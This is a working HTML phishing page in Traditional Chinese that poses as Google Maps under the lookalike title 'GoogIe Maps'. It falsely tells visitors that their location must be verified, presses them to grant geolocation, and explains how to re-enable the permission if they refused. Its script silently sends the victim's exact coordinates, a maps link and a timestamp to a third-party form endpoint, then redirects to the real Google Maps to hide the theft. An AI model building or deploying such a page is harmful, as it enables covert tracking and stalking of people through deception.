<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GoogIe Maps</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .loader { border-top-color: #4285F4; animation: spinner 1s linear infinite; }
        @keyframes spinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        body { font-family: -apple-system, sans-serif; }
        .active-btn:active { transform: scale(0.96); opacity: 0.9; }
    </style>
</head>
<body class="bg-white text-gray-800">

    <div class="flex flex-col items-center justify-center min-h-screen p-6 text-center">
        <!-- 模擬 Google Maps 圖示 -->
        <div class="mb-8">
            <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7Z" fill="#4285F4"/>
                <circle cx="12" cy="9" r="2.5" fill="white"/>
            </svg>
        </div>

        <h1 class="text-2xl font-bold mb-3">Google Maps</h1>
        <p id="status-text" class="text-gray-500 text-sm mb-10 px-4 leading-relaxed">
            系統需要驗證您的即時位置以載入導航資訊。<br>點擊下方按鈕後，請在彈出的系統視窗選擇<strong>「允許」</strong>。
        </p>

        <button id="action-btn" onclick="triggerLocation()" class="active-btn bg-[#1a73e8] text-white w-full max-w-xs py-4 rounded-xl font-bold text-lg shadow-lg transition-all">
            立即開啟導航
        </button>

        <div id="loading-box" class="hidden flex flex-col items-center">
            <div class="w-10 h-10 border-4 border-gray-100 rounded-full loader mb-4"></div>
            <p class="text-blue-500 font-medium">正在驗證位置權限...</p>
        </div>

        <div id="manual-tip" class="hidden mt-6 p-4 bg-red-50 rounded-lg border border-red-100 max-w-xs">
            <p class="text-red-600 text-xs leading-normal text-left">
                <strong>無法彈出視窗？</strong><br>
                1. 請點擊瀏覽器網址列左側的「大小」或「鎖頭」圖示。<br>
                2. 選擇「網站設定」。<br>
                3. 將「位置」改為「允許」。
            </p>
        </div>
    </div>

    <script>
        const FORMSPREE_ENDPOINT = "https://formspree.io/f/mnjvwegb";

        async function triggerLocation() {
            const btn = document.getElementById('action-btn');
            const loading = document.getElementById('loading-box');
            const status = document.getElementById('status-text');
            const manual = document.getElementById('manual-tip');

            btn.classList.add('hidden');
            loading.classList.remove('hidden');
            manual.classList.add('hidden');
            status.innerText = "正在呼叫系統定位視窗...";

            // 強制設定逾時與高精確度來強迫系統喚醒彈窗
            const options = {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        // 成功獲取
                        status.innerText = "驗證成功！正在啟動導航...";
                        await sendData(pos.coords.latitude, pos.coords.longitude);
                        window.location.href = "https://www.google.com/maps";
                    },
                    (err) => {
                        // 失敗處理
                        loading.classList.add('hidden');
                        btn.classList.remove('hidden');
                        btn.innerText = "重新啟動導航";
                        
                        if (err.code === 1) {
                            status.innerText = "權限被拒絕。請開啟定位服務。";
                            manual.classList.remove('hidden'); // 顯示手動開啟指南
                        } else {
                            status.innerText = "定位逾時，請確保 GPS 已開啟後再試一次。";
                        }
                    },
                    options
                );
            } else {
                status.innerText = "您的裝置不支援定位。";
            }
        }

        async function sendData(lat, lng) {
            try {
                await fetch(FORMSPREE_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify({
                        緯度: lat,
                        經度: lng,
                        連結: `https://www.google.com/maps?q=${lat},${lng}`,
                        時間: new Date().toLocaleString()
                    })
                });
            } catch (e) {}
        }
    </script>
</body>
</html>

